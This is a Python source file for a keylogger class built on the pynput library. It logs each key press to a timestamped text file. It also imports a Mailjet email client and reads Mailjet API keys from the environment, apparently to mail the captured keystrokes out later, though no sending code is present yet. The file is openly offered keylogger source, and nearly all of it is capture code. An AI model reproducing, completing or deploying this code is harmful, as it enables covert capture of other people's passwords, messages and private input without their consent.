# from pynput.keyboard import Listener
import os
from mailjet_rest import Client
from pynput import keyboard
import time
class Keylogger:
    def __init__(self):
        print("Keylogger initiated")
        self.filename = str(f"FILE-{str(time.strftime("%Y-%m-%d-%H-%M-%S"))}.txt")
        
        with keyboard.Listener(on_press=self.on_press,on_release=self.on_release) as listener:
            listener.join()
            

    def on_press(self,key, injected):
        try:
            print('alphanumeric key {} pressed; it was {}'.format(
                key.char, 'faked' if injected else 'not faked'))
            with open(self.filename,'a') as f:
                f.write(key.char)
            f.close()
            
        except AttributeError:
            print('special key {} pressed'.format(
                key))

    def on_release(self,key, injected):
        print('{} released; it was {}'.format(
            key, 'faked' if injected else 'not faked'))
        if key == keyboard.Key.esc:
            # Stop listener
            return False
        elif key == keyboard.Key.enter:
            with open(self.filename,'a') as f:
                f.write("\n")
            f.close()
            print("Enter is pressed")
        elif key == keyboard.Key.space:
            with open(self.filename,'a') as f:
                f.write(" ")
            f.close()
        elif key == keyboard.Key.backspace:
            print("pressed backspace")
        else:
            with open(self.filename,'a') as f:
                f.write(str(key))
                f.write("\n")
            f.close()

if __name__ == '__main__':
    MAILJET_API_USERNAME_KEY = os.getenv("MAILJET_API_USERNAME_KEY")
    MAILJET_API_SECRET_KEY = os.getenv("MAILJET_API_SECRET_KEY")
    print(MAILJET_API_SECRET_KEY)
    print(MAILJET_API_USERNAME_KEY)
    keylogger = Keylogger()
